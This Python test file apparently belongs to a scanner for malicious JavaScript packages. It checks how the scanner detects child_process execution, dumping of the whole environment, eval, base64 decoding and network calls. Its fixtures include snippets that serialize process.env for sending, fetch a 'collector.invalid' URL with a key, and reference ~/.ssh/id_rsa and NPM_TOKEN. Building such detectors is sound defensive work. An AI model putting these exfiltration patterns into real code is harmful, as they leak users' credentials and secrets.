from pkgguard_analyzer.code_scan.js_facts import extract_facts


def facts(code: str):
    return extract_facts(code.encode())


def test_child_process_exec_via_alias_and_destructuring():
    f = facts('const cp = require("child_process"); cp.execSync("ls");\nconst { spawn } = require("node:child_process"); spawn("x");')
    assert len(f.exec_calls) == 2
    assert "child_process" in f.modules


def test_regex_exec_is_not_a_system_command():
    f = facts('const cp = require("child_process"); /a/.exec("abc"); const m = re.exec(s);')
    assert f.exec_calls == []


def test_es_module_imports():
    f = facts('import { execSync as run } from "child_process";\nimport * as h from "https";\nrun("id"); h.get("u");')
    assert len(f.exec_calls) == 1
    assert len(f.network_calls) == 1


def test_env_dump_vs_single_variable():
    assert len(facts("send(JSON.stringify(process.env))").env_dumps) == 1
    assert facts("const home = process.env.HOME; const x = process.env['PATH'];").env_dumps == []
    assert facts("const { HOME, USER } = process.env;").env_dumps == []


def test_dynamic_code_forms():
    f = facts('eval(x); new Function("return 1"); globalThis["eval"](y); const vm = require("vm"); vm.runInNewContext(z);')
    assert len(f.dynamic_code) == 4


def test_decode_calls():
    f = facts('Buffer.from(data, "base64"); atob(s); Buffer.from("text", "utf8");')
    assert len(f.decode_calls) == 2


def test_network_globals_and_recon():
    f = facts('fetch("https://a.invalid"); new WebSocket(u); const os = require("os"); os.hostname(); os.homedir();')
    assert len(f.network_calls) == 2
    assert len(f.recon_calls) == 1


def test_strings_collected_with_lines_but_not_comments():
    f = facts('// ~/.ssh/id_rsa in a comment\nconst p = "~/.ssh/id_rsa";')
    assert [(s.raw, s.location.line) for s in f.strings] == [("~/.ssh/id_rsa", 2)]


def test_template_strings():
    f = facts("fetch(`https://collector.invalid/${key}`)")
    assert f.strings[0].raw == "https://collector.invalid/"


def test_copying_env_for_child_process_is_not_a_dump():
    f = facts('spawn(cmd, args, { env: { ...process.env, EXTRA: "1" } }); execSync(c, { env: process.env });')
    assert f.env_dumps == []
    assert len(f.env_copies) == 2


def test_env_variable_names_are_recorded():
    f = facts('const t = process.env.NPM_TOKEN; const h = process.env["HOME"]; const { CI, key: ALIAS } = process.env;')
    assert f.env_names == {"NPM_TOKEN", "HOME", "CI", "key"}
